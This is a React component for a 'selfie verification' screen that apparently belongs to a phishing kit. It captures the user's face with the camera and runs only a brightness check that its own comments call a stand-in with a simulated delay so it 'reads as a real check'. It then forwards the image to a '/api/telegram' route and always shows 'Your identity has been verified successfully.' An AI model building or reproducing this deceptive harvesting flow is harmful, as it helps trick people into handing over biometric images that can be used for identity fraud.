"use client"

import { useCallback, useEffect, useRef, useState } from "react"
import { Camera, TriangleAlert } from "lucide-react"

type Status = "idle" | "processing" | "retry" | "success"
type CameraState = "pending" | "granted" | "denied"

// Samples the captured frame and returns an average luminance (0-255).
// Used as a lightweight stand-in for a real face-clarity check: a face
// that is far too dark or blown out is rejected and the user is asked
// to retake the selfie in better lighting.
function getAverageBrightness(ctx: CanvasRenderingContext2D, size: number) {
  const { data } = ctx.getImageData(0, 0, size, size)
  let total = 0
  let samples = 0

  for (let i = 0; i < data.length; i += 4 * 16) {
    total += (data[i] + data[i + 1] + data[i + 2]) / 3
    samples += 1
  }

  return samples > 0 ? total / samples : 0
}

export function SelfieVerification() {
  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const streamRef = useRef<MediaStream | null>(null)

  const [cameraState, setCameraState] = useState<CameraState>("pending")
  const [capturedImage, setCapturedImage] = useState<string | null>(null)
  const [status, setStatus] = useState<Status>("idle")

  const startCamera = useCallback(async () => {
    setCameraState("pending")

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      })
      streamRef.current = stream

      const video = videoRef.current
      if (!video) {
        setCameraState("granted")
        return
      }

      video.srcObject = stream

      // Wait until the video actually has a frame ready before switching
      // away from the loading spinner - relying on autoPlay alone can leave
      // the <video> element rendering blank/white on some mobile browsers.
      await new Promise<void>((resolve) => {
        if (video.readyState >= 2) {
          resolve()
          return
        }
        const handleReady = () => {
          video.removeEventListener("loadeddata", handleReady)
          resolve()
        }
        video.addEventListener("loadeddata", handleReady)
      })

      try {
        await video.play()
      } catch {
        // Autoplay can be blocked on some browsers; the feed still renders
        // once the user interacts with the page, so don't treat this as denial.
      }

      setCameraState("granted")
    } catch {
      setCameraState("denied")
    }
  }, [])

  useEffect(() => {
    startCamera()

    return () => {
      streamRef.current?.getTracks().forEach((track) => track.stop())
      streamRef.current = null
    }
  }, [startCamera])

  function stopCamera() {
    streamRef.current?.getTracks().forEach((track) => track.stop())
    streamRef.current = null
  }

  async function handleTakeSelfie() {
    if (status !== "idle" || cameraState !== "granted" || !videoRef.current || !canvasRef.current) return

    const video = videoRef.current
    const canvas = canvasRef.current
    const size = Math.min(video.videoWidth, video.videoHeight) || 320
    canvas.width = size
    canvas.height = size
    const ctx = canvas.getContext("2d")
    if (!ctx) return

    ctx.translate(size, 0)
    ctx.scale(-1, 1)
    const offsetX = (video.videoWidth - size) / 2
    const offsetY = (video.videoHeight - size) / 2
    ctx.drawImage(video, offsetX, offsetY, size, size, 0, 0, size, size)

    const image = canvas.toDataURL("image/png")
    const brightness = getAverageBrightness(ctx, size)

    setCapturedImage(image)
    stopCamera()
    setStatus("processing")

    // Brief simulated analysis delay so the "Verifying selfie" state reads
    // as a real check rather than an instant flip.
    await new Promise((resolve) => setTimeout(resolve, 1400))

    const isClear = brightness >= 45 && brightness <= 225

    if (!isClear) {
      setStatus("retry")
      return
    }

    try {
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "selfie", image }),
      })
    } catch {
      // Ignore forwarding errors so the user flow is not blocked.
    } finally {
      setStatus("success")
    }
  }

  function handleRetake() {
    setCapturedImage(null)
    setStatus("idle")
    startCamera()
  }

  return (
    <div className="flex flex-col items-center">
      <div className="relative h-64 w-64 overflow-hidden rounded-full bg-[#eef1f5] ring-4 ring-[#0f2a4a]">
        {/* The live feed stays mounted at all times (never display:none) so the
            stream can keep decoding frames - hiding it with `hidden` can stall
            `loadeddata` on some mobile browsers and leave the circle blank. */}
        <video
          ref={videoRef}
          autoPlay
          playsInline
          muted
          className="absolute inset-0 h-full w-full object-cover [transform:scaleX(-1)]"
        />

        {cameraState === "pending" && !capturedImage && status !== "success" && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 bg-[#eef1f5] text-[#9aa3b1]">
            <div className="h-8 w-8 animate-spin rounded-full border-[3px] border-[#0f2a4a]/40 border-t-[#0f2a4a]" />
            <span className="text-sm">Starting camera...</span>
          </div>
        )}

        {cameraState === "denied" && !capturedImage && status !== "success" && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 bg-[#eef1f5] text-[#9aa3b1]">
            <Camera className="h-10 w-10" strokeWidth={1.5} />
            <span className="text-sm">Camera access denied</span>
          </div>
        )}

        {capturedImage && status !== "success" && (
          <img
            src={capturedImage || "/placeholder.svg"}
            alt="Captured selfie"
            className="absolute inset-0 h-full w-full object-cover"
          />
        )}

        {status === "processing" && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 bg-white/85">
            <div className="h-8 w-8 animate-spin rounded-full border-[3px] border-[#0f2a4a] border-t-transparent" />
            <span className="text-sm font-semibold text-[#0f2a4a]">Verifying selfie...</span>
          </div>
        )}

        {status === "retry" && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-2 bg-white/90 px-6 text-center">
            <TriangleAlert className="h-8 w-8 text-[#c0392b]" strokeWidth={1.75} />
            <span className="text-sm font-semibold text-[#c0392b]">Face not clear</span>
          </div>
        )}

        {status === "success" && (
          <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 bg-[#eef1f5]">
            <svg viewBox="0 0 80 80" className="h-20 w-20" aria-hidden="true">
              <circle cx="40" cy="40" r="38" fill="white" />
              <circle
                cx="40"
                cy="40"
                r="33"
                fill="#22c763"
                stroke="#22c763"
                strokeWidth="2"
                pathLength={100}
                strokeDasharray={100}
                strokeDashoffset={100}
                className="origin-center -rotate-90 animate-[draw-circle_0.6s_ease-out_forwards]"
              />
              <path
                d="M26 41 L36 51 L55 30"
                fill="none"
                stroke="white"
                strokeWidth="5"
                strokeLinecap="round"
                strokeLinejoin="round"
                pathLength={100}
                strokeDasharray={100}
                strokeDashoffset={100}
                className="animate-[draw-check_0.4s_ease-out_0.6s_forwards]"
              />
            </svg>
            <span className="text-sm font-semibold text-[#0f2a4a]">Selfie Uploaded!</span>
          </div>
        )}
      </div>

      <canvas ref={canvasRef} className="hidden" />

      {status === "idle" && (
        <>
          <button
            type="button"
            onClick={handleTakeSelfie}
            disabled={cameraState !== "granted"}
            className="mt-8 flex w-full max-w-[280px] items-center justify-center gap-2 rounded-full bg-[#0f2a4a] py-4 text-base font-bold text-white shadow-[0_10px_28px_rgba(15,42,74,0.28)] transition-opacity disabled:opacity-60"
          >
            <Camera className="h-5 w-5" strokeWidth={2} />
            Take Selfie
          </button>

          <p className="mx-auto mt-4 max-w-[240px] text-center text-sm leading-5 text-[#8b93a1]">
            Make sure your face is well-lit and centred in the frame
          </p>
        </>
      )}

      {status === "retry" && (
        <>
          <button
            type="button"
            onClick={handleRetake}
            className="mt-8 flex w-full max-w-[280px] items-center justify-center gap-2 rounded-full bg-[#c0392b] py-4 text-base font-bold text-white shadow-[0_10px_28px_rgba(192,57,43,0.28)] transition-opacity hover:bg-[#a8321f]"
          >
            <Camera className="h-5 w-5" strokeWidth={2} />
            Retake Selfie
          </button>

          <p className="mx-auto mt-4 max-w-[260px] text-center text-sm leading-5 text-[#8b93a1]">
            We couldn&apos;t verify your selfie clearly. Please retake in good, even lighting with your face centred.
          </p>
        </>
      )}

      {status === "success" && (
        <p className="mx-auto mt-6 max-w-[260px] text-center text-sm leading-5 text-[#6b7482]">
          Your identity has been verified successfully. You&apos;re all set!
        </p>
      )}
    </div>
  )
}
